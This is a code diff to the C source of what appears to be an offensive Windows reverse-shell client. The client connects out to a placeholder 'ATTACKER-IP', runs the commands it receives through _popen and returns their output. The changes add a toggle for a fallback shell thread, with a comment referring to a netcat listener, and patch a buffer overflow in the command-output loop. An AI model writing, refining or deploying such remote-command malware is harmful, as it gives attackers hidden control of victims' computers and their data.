@@ -30,6 +30,8 @@ struct sockaddr_in ServerAddress;
 char *ServerIP = "ATTACKER-IP"; //CHANGE THIS!
 unsigned short ServerPort = 50000;
 
+int UseFallBackShell = 0; //Disabled by default (Uses TCP), and with multiple clients may create problems. If you want the client to start a fallback shell, set this to 1 (The server currently won't have to listen using 'nc -lvnp 38524')
+
 struct sockaddr_in FileServerAddress;
 unsigned short ServerTransferPort = 49500;
 
@@ -426,7 +428,7 @@ void Run()
 			fd = _popen(ReceiveBuffer, "r");
 			while (fgets(ContainerBuffer, 1024, fd) != NULL)
 			{
-				strcat(TotalResponseBuffer, ContainerBuffer);
+				strncat(TotalResponseBuffer, ContainerBuffer, sizeof(TotalResponseBuffer) - strlen(TotalResponseBuffer) - 1);
 			}
 			send(sock, TotalResponseBuffer, sizeof(TotalResponseBuffer), 0);
 			fclose(fd);
@@ -495,7 +497,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
 		goto Connect;
 	}
 
-	HANDLE FallBack = CreateThread(NULL, 0, FallBackConnection, NULL, 0, NULL);
+	if (UseFallBackShell != 0)
+	{
+		HANDLE FallBack = CreateThread(NULL, 0, FallBackConnection, NULL, 0, NULL);
+	}
 
 	Run();
 }
